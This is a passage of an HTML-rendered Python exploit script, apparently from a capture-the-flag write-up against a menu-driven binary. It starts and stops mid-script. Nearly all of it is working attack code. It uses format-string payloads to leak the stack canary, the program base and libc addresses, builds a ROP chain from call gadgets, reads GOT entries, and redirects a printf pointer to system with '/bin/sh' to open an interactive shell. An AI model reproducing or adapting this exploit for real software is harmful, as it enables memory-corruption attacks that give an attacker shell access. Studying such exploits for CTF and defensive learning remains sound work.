spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;io</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number12 index11 alt1"><code class="plain plain">def&nbsp;t_create(io,&nbsp;buff):</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until("3.quit\n")</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.write("create&nbsp;")</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until(":")</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline(str(len(buff)))</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until(":")</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.write(buff)</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number21 index20 alt2"><code class="plain plain">def&nbsp;t_delete(io,&nbsp;tid,&nbsp;padding&nbsp;=&nbsp;"yes"):</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until("3.quit\n")</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.write("delete&nbsp;")</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until(":")</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline(str(tid))</code></div><div class="line number27 index26 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until(":")</code></div><div class="line number28 index27 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline(padding)</code></div><div class="line number29 index28 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number30 index29 alt1"><code class="plain plain">g_io&nbsp;=&nbsp;0</code></div><div class="line number31 index30 alt2"><code class="plain plain">g_canary&nbsp;=&nbsp;0</code></div><div class="line number32 index31 alt1"><code class="plain plain">proc_addr&nbsp;=&nbsp;0</code></div><div class="line number33 index32 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number34 index33 alt1"><code class="plain plain">def&nbsp;gen_payload(func_got,&nbsp;arg1,&nbsp;arg2,&nbsp;arg3):</code></div><div class="line number35 index34 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#set_args_addr</code></div><div class="line number36 index35 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">set_args_addr&nbsp;=&nbsp;0x11da&nbsp;+&nbsp;proc_addr</code></div><div class="line number37 index36 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">call_func_addr&nbsp;=&nbsp;0x11c0&nbsp;+&nbsp;proc_addr</code></div><div class="line number38 index37 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number39 index38 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;""</code></div><div class="line number40 index39 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(set_args_addr)</code></div><div class="line number41 index40 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;rbx&nbsp;=&nbsp;0</code></div><div class="line number42 index41 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;rbp</code></div><div class="line number43 index42 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(func_got)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r12</code></div><div class="line number44 index43 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(arg3)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r13</code></div><div class="line number45 index44 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(arg2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r14</code></div><div class="line number46 index45 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(arg1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r15</code></div><div class="line number47 index46 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(call_func_addr)</code></div><div class="line number48 index47 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number49 index48 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#nouse&nbsp;padding&nbsp;:&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp,&nbsp;8</code></div><div class="line number50 index49 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;rbx&nbsp;=&nbsp;0</code></div><div class="line number51 index50 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;rbp</code></div><div class="line number52 index51 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(func_got)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r12</code></div><div class="line number53 index52 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(arg3)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r13</code></div><div class="line number54 index53 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(arg2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r14</code></div><div class="line number55 index54 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(arg1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#pop&nbsp;r15</code></div><div class="line number56 index55 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(call_func_addr)</code></div><div class="line number57 index56 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number58 index57 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;payload</code></div><div class="line number59 index58 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number60 index59 alt1"><code class="plain plain">def&nbsp;leak_addr(addr):</code></div><div class="line number61 index60 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">global&nbsp;g_io</code></div><div class="line number62 index61 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">global&nbsp;proc_addr</code></div><div class="line number63 index62 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number64 index63 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(g_io,&nbsp;1)</code></div><div class="line number65 index64 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number66 index65 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">index0&nbsp;=&nbsp;9</code></div><div class="line number67 index66 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">printf_plt&nbsp;=&nbsp;0x9d0&nbsp;+&nbsp;proc_addr</code></div><div class="line number68 index67 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number69 index68 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#print&nbsp;"printf_plt:",&nbsp;hex(printf_plt)</code></div><div class="line number70 index69 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number71 index70 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;""</code></div><div class="line number72 index71 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;("%%%d$s--..--"%(index0)).ljust(0x18,&nbsp;'a')</code></div><div class="line number73 index72 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(printf_plt)[:3]&nbsp;+&nbsp;"\x00"</code></div><div class="line number74 index73 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(g_io,&nbsp;payload)</code></div><div class="line number75 index74 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number76 index75 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;=&nbsp;"yes.aaaa"</code></div><div class="line number77 index76 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;+=&nbsp;l64(addr)</code></div><div class="line number78 index77 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(g_io,&nbsp;2,&nbsp;padding)</code></div><div class="line number79 index78 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#data&nbsp;=&nbsp;io.read_until_timeout(2)</code></div><div class="line number80 index79 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;=&nbsp;g_io.read_until("--..--")[:-6]</code></div><div class="line number81 index80 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;+=&nbsp;"\x00"</code></div><div class="line number82 index81 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;data</code></div><div class="line number83 index82 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number84 index83 alt1"><code class="plain plain">def&nbsp;get_shell(system_addr):</code></div><div class="line number85 index84 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">global&nbsp;g_io</code></div><div class="line number86 index85 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">global&nbsp;proc_addr</code></div><div class="line number87 index86 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number88 index87 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(g_io,&nbsp;1)</code></div><div class="line number89 index88 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number90 index89 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">index0&nbsp;=&nbsp;9</code></div><div class="line number91 index90 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">printf_plt&nbsp;=&nbsp;0x9d0&nbsp;+&nbsp;proc_addr</code></div><div class="line number92 index91 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number93 index92 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#print&nbsp;"printf_plt:",&nbsp;hex(printf_plt)</code></div><div class="line number94 index93 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number95 index94 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;""</code></div><div class="line number96 index95 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;("/bin/sh;").ljust(0x18,&nbsp;'a')</code></div><div class="line number97 index96 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(system_addr)[:6]&nbsp;+&nbsp;"\x00"</code></div><div class="line number98 index97 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(g_io,&nbsp;payload)</code></div><div class="line number99 index98 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number100 index99 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;=&nbsp;"yes.aaaa"</code></div><div class="line number101 index100 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;+=&nbsp;""</code></div><div class="line number102 index101 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(g_io,&nbsp;2,&nbsp;padding)</code></div><div class="line number103 index102 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#data&nbsp;=&nbsp;io.read_until_timeout(2)</code></div><div class="line number104 index103 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.interact()</code></div><div class="line number105 index104 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number106 index105 alt1"><code class="plain plain">from&nbsp;pwn&nbsp;import&nbsp;*</code></div><div class="line number107 index106 alt2"><code class="plain plain">def&nbsp;pwn(io):</code></div><div class="line number108 index107 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">global&nbsp;g_io</code></div><div class="line number109 index108 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">global&nbsp;proc_addr</code></div><div class="line number110 index109 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">g_io&nbsp;=&nbsp;io</code></div><div class="line number111 index110 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number112 index111 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until(":")</code></div><div class="line number113 index112 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline("927e613a91620da8c5f10936faf70f4dgDR95OLX")</code></div><div class="line number114 index113 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number115 index114 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(io,&nbsp;"a"*0x20)</code></div><div class="line number116 index115 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(io,&nbsp;"a"*0x20)</code></div><div class="line number117 index116 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(io,&nbsp;"a"*0x20)</code></div><div class="line number118 index117 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(io,&nbsp;"a"*0x20)</code></div><div class="line number119 index118 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number120 index119 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(io,&nbsp;0)</code></div><div class="line number121 index120 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(io,&nbsp;1)</code></div><div class="line number122 index121 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(io,&nbsp;2)</code></div><div class="line number123 index122 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(io,&nbsp;3)</code></div><div class="line number124 index123 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number125 index124 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number126 index125 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(io,&nbsp;"a"*0x40)</code></div><div class="line number127 index126 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number128 index127 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number129 index128 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">release_func&nbsp;=&nbsp;0xD6c</code></div><div class="line number130 index129 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">printf_plt&nbsp;=&nbsp;0xb9d0</code></div><div class="line number131 index130 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number132 index131 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#io.gdb_hint()</code></div><div class="line number133 index132 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#printf_plt&nbsp;=&nbsp;int(raw_input("printf_plt:"),&nbsp;16)</code></div><div class="line number134 index133 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number135 index134 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number136 index135 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">index0&nbsp;=&nbsp;9</code></div><div class="line number137 index136 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">ret_index&nbsp;=&nbsp;(0x458&nbsp;-&nbsp;0x348)/8&nbsp;+&nbsp;index0</code></div><div class="line number138 index137 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">__libc_start_main_index&nbsp;=&nbsp;(0x878&nbsp;-&nbsp;0x348)/8&nbsp;+&nbsp;index0</code></div><div class="line number139 index138 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">canary_index&nbsp;=&nbsp;(0x108)/8&nbsp;+&nbsp;index0&nbsp;-&nbsp;1</code></div><div class="line number140 index139 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number141 index140 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;""</code></div><div class="line number142 index141 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;("%%%d$p.%%%d$p.%%%d$p--..--"%(ret_index,&nbsp;__libc_start_main_index,&nbsp;canary_index)).ljust(0x18,&nbsp;'a')</code></div><div class="line number143 index142 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;+=&nbsp;l64(printf_plt)[:2]&nbsp;+&nbsp;"\x00"</code></div><div class="line number144 index143 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_create(io,&nbsp;payload)</code></div><div class="line number145 index144 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number146 index145 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;=&nbsp;"yes.aaaa"</code></div><div class="line number147 index146 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;+=&nbsp;"b"*8</code></div><div class="line number148 index147 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;+=&nbsp;"c"*8</code></div><div class="line number149 index148 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t_delete(io,&nbsp;2,&nbsp;padding)</code></div><div class="line number150 index149 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#data&nbsp;=&nbsp;io.read_until_timeout(2)</code></div><div class="line number151 index150 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;=&nbsp;io.read_until("--..--")</code></div><div class="line number152 index151 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;data</code></div><div class="line number153 index152 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;"--..--"&nbsp;not&nbsp;in&nbsp;data:</code></div><div class="line number154 index153 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;False</code></div><div class="line number155 index154 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number156 index155 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;=&nbsp;data[:data.find("--..--")]</code></div><div class="line number157 index156 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">items&nbsp;=&nbsp;data.split('.')</code></div><div class="line number158 index157 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">proc_addr&nbsp;=&nbsp;int(items[0],&nbsp;16)&nbsp;-&nbsp;0xcf2</code></div><div class="line number159 index158 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">__libc_start_main_addr&nbsp;=&nbsp;int(items[1],&nbsp;16)</code></div><div class="line number160 index159 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"__libc_start_main_addr:",&nbsp;hex(__libc_start_main_addr)</code></div><div class="line number161 index160 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number162 index161 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">canary_data&nbsp;=&nbsp;int(items[2],&nbsp;16)</code></div><div class="line number163 index162 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"canary_data:",&nbsp;hex(canary_data)</code></div><div class="line number164 index163 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"proc_addr:",&nbsp;hex(proc_addr)</code></div><div class="line number165 index164 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">g_canary&nbsp;=&nbsp;canary_data</code></div><div class="line number166 index165 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"get&nbsp;it"</code></div><div class="line number167 index166 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number168 index167 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">read_got&nbsp;=&nbsp;0x0000000000202058&nbsp;+&nbsp;proc_addr</code></div><div class="line number169 index168 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;=&nbsp;leak_addr(read_got)</code></div><div class="line number170 index169 alt1"><code class="plain 